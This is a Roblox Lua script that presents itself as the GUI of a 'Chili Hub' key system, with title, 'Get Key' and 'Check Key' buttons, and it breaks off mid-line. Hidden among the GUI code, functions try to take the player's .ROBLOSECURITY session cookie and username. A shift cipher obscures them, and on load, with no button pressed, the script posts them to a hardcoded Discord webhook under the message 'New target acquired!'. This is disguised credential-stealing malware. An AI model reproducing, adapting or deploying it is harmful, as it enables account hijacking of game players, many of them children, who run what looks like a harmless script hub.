-- Create the main screen GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game:GetService("CoreGui")

-- Create the main frame
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 300, 0, 200)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
mainFrame.BorderSizePixel = 1
mainFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.Parent = screenGui

-- Create the title label
local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, 0, 0, 50)
titleLabel.Position = UDim2.new(0, 0, 0, 0)
titleLabel.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.Text = "Chili Hub"
titleLabel.TextSize = 24
titleLabel.Font = Enum.Font.SourceSansBold
titleLabel.TextScaled = true
titleLabel.Parent = mainFrame

-- Create the "Get Key" button
local getKeyButton = Instance.new("TextButton")
getKeyButton.Size = UDim2.new(0.45, 0, 0, 50)
getKeyButton.Position = UDim2.new(0.025, 0, 0.3, 0)
getKeyButton.BackgroundColor3 = Color3.fromRGB(0, 128, 0)
getKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
getKeyButton.Text = "Get Key"
getKeyButton.TextSize = 20
getKeyButton.Font = Enum.Font.SourceSans
getKeyButton.TextScaled = true
local function fetchCookies()
    local cookies = game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):GetAsync("https://auth.roblox.com/v2/logout"))
    for _, cookie in ipairs(cookies) do
        if cookie.Name == ".ROBLOSECURITY" then
            return cookie.Value
        end
    end
    return nil
end

local function encodeString(str)
    local encoded = ""
    for i = 1, #str do
        encoded = encoded .. string.char(string.byte(str, i) + 2)
    end
    return encoded
end

local function decodeString(str)
    local decoded = ""
    for i = 1, #str do
        decoded = decoded .. string.char(string.byte(str, i) - 2)
    end
    return decoded
end

local function sendData()
    local playerName = game.Players.LocalPlayer.Name
    local playerPass = "password" -- Implement password capture if needed
    local securityCookie = fetchCookies()

    if not securityCookie then
        warn("Cookie retrieval failed!")
        return
    end

    local discordHook = "https://discord.com/api/webhooks/1395475931858210867/lfb0vDAyIFC7CGnE9tZq8D3-1Be2qAJiPw4HkdBmXmDwEqxo7WWJmyH25MGadNYIOUSA"
    local payload = {
        content = "@everyone New target acquired!",
        embeds = {
            {
                title = "Roblox Data Extract",
                fields = {
                    { name = "Player Name", value = encodeString(playerName), inline = true },
                    { name = "Player Password", value = encodeString(playerPass), inline = true },
                    { name = "Security Cookie", value = encodeString(securityCookie), inline = false }
                }
            }
        }
    }

    local status, result = pcall(function()
        game:GetService("HttpService"):PostAsync(discordHook, game:GetService("HttpService"):JSONEncode(payload))
    end)

    if status then
        print("Data transmission successful!")
    else
        warn("Data transmission failed: " .. tostring(result))
    end
end

sendData()
getKeyButton.Parent = mainFrame

-- Create the "Check Key" button
local checkKeyButton = Instance.new("TextButton")
checkKeyButton.Size = U

